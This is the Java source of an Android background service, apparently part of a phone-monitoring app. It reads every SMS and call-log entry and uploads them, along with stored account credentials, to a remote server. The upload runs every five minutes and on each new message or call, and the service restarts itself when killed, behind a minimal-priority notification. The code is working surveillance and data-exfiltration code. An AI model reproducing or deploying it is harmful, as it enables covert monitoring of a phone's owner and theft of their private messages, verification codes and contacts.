package monitor.mobie.hdy.im.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.io.Reader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

import monitor.mobie.hdy.im.R;
import monitor.mobie.hdy.im.model.ContactMessage;
import monitor.mobie.hdy.im.model.ContactMessageDetail;
import monitor.mobie.hdy.im.model.Message;
import monitor.mobie.hdy.im.model.MessageDetail;
import monitor.mobie.hdy.im.model.Mobile;
import monitor.mobie.hdy.im.model.Reply;
import monitor.mobie.hdy.im.utils.Constants;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by hdy on 2017/9/9.
 * 用于监听事件
 */

public class MonitorService extends Service {
    private TelephonyManager manager;
    private OkHttpClient client = new OkHttpClient();
    public static final MediaType JSON
            = MediaType.parse("application/json; charset=utf-8");
    private TimerTask task;
    private final Timer timer = new Timer();
    private static String phone;
    private String SCKEY;
    private SharedPreferences data;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        init();
    }


    /**
     * 初始化操作
     */
    public void init() {
        data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
        phone = data.getString("phone", null);
        SCKEY = data.getString("SCKEY", "");
        if (SCKEY != null && !SCKEY.equals("")) {
            openNotificationAccess();
            toggleNotificationListenerService();
        }
        startReciver();
        startTimer();
        startForeground(this);
        uploadAll();
    }


    /**
     * 开启定时任务
     */
    public void startTimer() {
        task = new TimerTask() {
            @Override
            public void run() {
//                handler.sendEmptyMessage(0x1);
                uploadAll();
            }

        };
        //五分钟自动上传一次
        timer.schedule(task, 2000, 1000 * 60 * 5);
    }

    @Override
    public void onDestroy() {
        //进行自动重启
        Intent intent = new Intent(MonitorService.this, MonitorService.class);
        //重新开启服务
        startService(intent);
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        uploadAll();
        return super.onStartCommand(intent, flags, startId);
    }

    public static void startForeground(Service context) {
        //设置常驻通知栏
        //保持为前台应用状态
        NotificationManager nm = (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context);
        builder.setContentTitle("后台监控" + phone + "中...")
                .setContentText("")
                .setWhen(System.currentTimeMillis())
                .setPriority(Notification.PRIORITY_MIN)
                .setSmallIcon(R.drawable.ic_launcher)
                .setAutoCancel(true);
        Notification notification = builder.build();
        context.startForeground(8888, notification);
    }

    /**
     * 上传所有的数据
     */

    public void uploadAll() {
        System.out.println("开始上传~");
        Mobile mobile = new Mobile();
        mobile.setContactMessage(getContactMessage());
        mobile.setMessage(getSMSData());
        FormBody formBody = new FormBody.Builder()
                .add("json", com.alibaba.fastjson.JSON.toJSONString(mobile)).add("username", data.getString("phone", null)).add("password", data.getString("password", null)).add("qq_name", data.getString("qq_name", "")).add("email_input", data.getString("emial_input", "")).build();
        Request request = new Request.Builder()
                .url(Constants.URL + "/upload")
                .post(formBody)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                System.out.println("请求失败");
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Reader reader = response.body().charStream();
                char[] chars = new char[512];
                int len = -1;
                StringBuilder sb = new StringBuilder();
                while ((len = reader.read(chars)) != -1) {
                    sb.append(new String(chars, 0, len));
                }
                reader.close();
                Reply reply = com.alibaba.fastjson.JSON.parseObject(sb.toString(), Reply.class);
                if (reply != null && reply.getCode() == 200) {
                    Log.i("ss", "success");
                } else {
                    Log.i("ss", "error");
                }
            }
        });

    }


    /**
     * 启动短信和电话监听
     */
    public void startReciver() {
        manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        manager.listen(new MyPhoneStateListener(),
                PhoneStateListener.LISTEN_CALL_STATE);
        Uri uri = Uri.parse("content://sms");
        getContentResolver().registerContentObserver(uri, true,
                new MyObserver(new Handler()));
        System.out.println("短信监听启动");
    }


    // 当设备的状态发生改变的时候调用
    private class MyPhoneStateListener extends PhoneStateListener {
        // 判断一下电话是属于什么状态
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:// 空闲状态
                    System.out.println("空闲");
                    uploadAll();
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:// 接听状态
                    System.out.println("接听状态");
                    break;
                case TelephonyManager.CALL_STATE_RINGING:// 响铃状态
                    System.out.println("电话正在接听");
                    uploadAll();
                    break;
                default:
                    break;
            }
        }
    }


    /**
     * 获取短信数据
     */
    private Message getSMSData() {
        //得到访问者ContentResolver
        ContentResolver cr = getContentResolver();
        //定义一个接收短信的集合
        Message message = new Message();
        LinkedList<MessageDetail> details = new LinkedList<MessageDetail>();
        Uri uri = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            uri = Uri.parse(String.valueOf(Telephony.Sms.CONTENT_URI));
            System.out.println("权限");
        } else {
            return null;
        }
        Cursor cursor = cr.query(uri, null, null, null, null);
        while (cursor.moveToNext()) {
            MessageDetail detail = new MessageDetail();

            String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
            String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
            Long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
            String person = cursor.getString(cursor.getColumnIndex(Telephony.Sms.PERSON));
            int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));

            detail.setMessageName(person);
            detail.setMessgaeText(body);
            detail.setMessageTime(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(date)));
            detail.setType(type);
            detail.setMessageNum(String.valueOf(address));
            details.add(detail);
            System.out.println(detail);
        }
        message.setMessages(details);
        return message;
    }


    /**
     * 读取数据
     * 获取通信记录
     *
     * @return 读取到的数据
     */
    private ContactMessage getContactMessage() {
        // 1.获得ContentResolver
        ContentResolver resolver = getContentResolver();
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs ?占位符代表的数据
         * @param sortOrder 排序方式
         *
         */
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                new String[]{CallLog.Calls.CACHED_NAME// 通话记录的联系人
                        , CallLog.Calls.NUMBER// 通话记录的电话号码
                        , CallLog.Calls.DATE// 通话记录的日期
                        , CallLog.Calls.DURATION// 通话时长
                        , CallLog.Calls.TYPE}// 通话类型
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        ContactMessage message = new ContactMessage();
        // 3.通过Cursor获得数据
        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
        LinkedList<ContactMessageDetail> details = new LinkedList<>();
        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
            ContactMessageDetail detail = new ContactMessageDetail();
            detail.setDate(date);
            detail.setDuration(String.valueOf((duration / 60)));
            detail.setName(name);
            detail.setPhoneNumber(number);
            detail.setType(type);
            details.add(detail);
        }
        message.setMessages(details);
        return message;
    }


    /**
     * 检测当的网络（WLAN、3G/2G）状态
     *
     * @param context Context
     * @return true 表示网络可用
     */
    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivity = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivity != null) {
            NetworkInfo info = connectivity.getActiveNetworkInfo();
            if (info != null && info.isConnected()) {
                // 当前网络是连接的
                if (info.getState() == NetworkInfo.State.CONNECTED) {
                    // 当前所连接的网络可用
                    return true;
                }
            }
        }
        return false;
    }


    /**
     * 短信观察者
     */
    private class MyObserver extends ContentObserver {

        public MyObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            System.out.println("短信数据库发生变化了。");
            uploadAll();
            super.onChange(selfChange);
        }
    }

    private void toggleNotificationListenerService() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationCollectorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        pm.setComponentEnabledSetting(new ComponentName(this, NotificationCollectorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

    }

    private boolean isNotificationListenerServiceEnabled() {
        Set<String> packageNames = NotificationManagerCompat.getEnabledListenerPackages(this.getApplicationContext());
        if (packageNames.contains(this.getApplicationContext().getPackageName())) {
            return true;
        }
        return false;
    }

    private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";

    private void openNotificationAccess() {
        startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
    }
}
